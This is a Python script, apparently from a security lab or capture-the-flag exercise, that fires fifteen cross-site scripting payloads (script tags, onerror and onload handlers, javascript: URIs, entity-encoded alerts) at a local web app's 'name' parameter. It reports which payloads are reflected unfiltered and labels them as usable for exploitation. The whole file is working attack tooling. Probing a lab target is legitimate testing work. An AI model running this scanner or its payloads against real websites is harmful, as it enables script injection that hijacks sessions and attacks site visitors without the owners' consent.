import requests
import urllib.parse
import urllib3
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "http://127.0.0.1:33152"
test_endpoint = "/page"

print("Testing connectivity to target...")

try:
    # First test basic connectivity
    response = requests.get(base_url, timeout=10, verify=False)
    print(f"[OK] Base URL reachable: {base_url} (Status: {response.status_code})")
    
    # Test endpoint exists
    endpoint_url = f"{base_url}{test_endpoint}"
    response = requests.get(endpoint_url, timeout=10, verify=False)
    print(f"[OK] Endpoint exists: {endpoint_url} (Status: {response.status_code})")
    
    # Check if 'name' parameter is expected
    test_url = f"{endpoint_url}?name=test"
    response = requests.get(test_url, timeout=10, verify=False)
    print(f"[OK] Parameter working: {test_url} (Status: {response.status_code})")
    
    # Show initial response
    if response.status_code == 200:
        print(f"\n[Initial Response Sample]:")
        print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
    
except Exception as e:
    print(f"[!] Connection error: {e}")
    print("Target may not be reachable or may require different approach.")
    exit()

# XSS test payloads (15 focused vectors)
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<svg onload=alert(1)>",
    "<a href=# onclick=alert(1)>x</a>",
    "<details open ontoggle=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    '<img src=x onerror="alert(1)">',
    "<svg/onload=alert(1)>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<embed src=data:text/html,<script>alert(1)</script>>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<iframe onload=alert(1)></iframe>",
    "<div onmouseover=alert(1)>x</div>"
]

print(f"\n\nStarting XSS filter analysis...")
print("=" * 80)

success_count = 0
blocked_count = 0
partial_count = 0
event_handlers_blocked = 0
tags_blocked = 0

for payload in xss_payloads:
    try:
        encoded = urllib.parse.quote(payload, safe='')
        url = f"{endpoint_url}?name={encoded}"
        
        response = requests.get(url, timeout=10, verify=False)
        response_text = response.text
        
        # Check reflection status
        if payload in response_text:
            print(f"\n[REFLECTED] {payload}")
            print(f"  Status: {response.status_code}")
            success_count += 1
            
            # Show context around reflection
            idx = response_text.index(payload)
            context = response_text[max(0, idx-100):min(len(response_text), idx+len(payload)+100)]
            print(f"  Context: ...{context}...")
            
        elif payload.lower() in response_text.lower():
            print(f"\n[PARTIAL] {payload}")
            print(f"  Status: {response.status_code}")
            print(f"  Note: Case modified in response")
            partial_count += 1
            
        else:
            print(f"\n[BLOCKED] {payload}")
            print(f"  Status: {response.status_code}")
            blocked_count += 1
            
            # Analyze what was filtered
            if 'onerror=' in payload or 'onload=' in payload or 'onclick=' in payload:
                event_handlers_blocked += 1
                
            tag_match = re.search(r'<(\w+)', payload)
            if tag_match:
                tag = f"<{tag_match.group(1)}"
                if tag not in response_text and tag.upper() not in response_text.upper():
                    tags_blocked += 1
                    print(f"  Tag completely removed: {tag}")
        
    except Exception as e:
        print(f"[ERROR] {payload}: {e}")

# Summary
print(f"\n\n{'=' * 80}")
print("FILTER ANALYSIS SUMMARY")
print("=" * 80)

print(f"\nTotal Tested: {len(xss_payloads)}")
print(f"Fully Reflected: {success_count}")
print(f"Partially Filtered: {partial_count}")
print(f"Fully Blocked: {blocked_count}")

if success_count > 0:
    print(f"\n[+] ATTACK VECTORS IDENTIFIED: At least {success_count} payloads fully reflected")
    print("[ ] These can be used for XSS exploitation")

# Analysis of blocked elements
print(f"\nFiltering Behavior:")
if event_handlers_blocked > 0:
    print(f"[-] Event handlers blocked/removed: {event_handlers_blocked} instances")
    
if tags_blocked > 0:
    print(f"[-] HTML tags blocked/removed: {tags_blocked} instances")

# Identify which vectors succeeded
print(f"\nSuccessful Vectors (REFLECTED):")
for payload in xss_payloads:
    try:
        encoded = urllib.parse.quote(payload, safe='')
        url = f"{endpoint_url}?name={encoded}"
        response = requests.get(url, timeout=10, verify=False)
        
        if payload in response.text:
            print(f"  - {payload}")
    except:
        pass

print("\nAnalysis complete.")
